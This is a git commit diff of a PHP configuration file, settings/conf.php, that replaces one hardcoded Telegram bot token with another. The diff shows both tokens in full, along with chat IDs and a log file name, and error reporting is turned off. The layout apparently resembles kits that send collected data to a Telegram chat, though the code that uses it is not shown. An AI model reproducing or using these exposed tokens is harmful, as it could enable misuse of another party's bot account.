8368e121920e6a2f6cc6a3a3d4c6c94f30d8ba07
HamadaRIgaloo <119463837+HamadaRIgaloo@users.noreply.github.com>
2022-12-03 16:08:27 +0100

    Update conf.php

--- settings/conf.php
+++ settings/conf.php
@@ -2,7 +2,7 @@
 
 error_reporting(0);
 
-define("TELEGRAM_TOKEN", "5856755195:AAHlySNc4BZ80yzJbHpcRKJAYCYqaf5vegI");
+define("TELEGRAM_TOKEN", "5794569310:AAHKTIK_YvamgIBGE0dUMf3QtR-N7acpu1o");
 define("TELEGRAM_CHAT_ID", "869785984");
 define("TELEGRAM_CHAT_IDD", "-869785984");
 define("TXT_FILE_NAME", 'mjinina.txt');
